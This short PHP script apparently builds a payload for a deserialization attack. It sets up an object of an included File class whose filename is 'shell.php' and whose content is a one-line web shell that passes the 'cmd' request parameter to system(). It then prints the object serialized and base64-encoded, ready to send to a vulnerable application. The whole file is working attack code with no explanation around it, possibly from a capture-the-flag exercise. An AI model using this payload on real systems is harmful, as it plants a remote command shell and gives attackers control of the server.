<?php
    include "file.php";
    $f = new File();
    $f->filename = "shell.php";
    $f->content = '<?php echo system($_REQUEST[\'cmd\']); ?>';
    echo $f->content;
    echo(serialize($f));
    echo base64_encode(serialize($f));
?>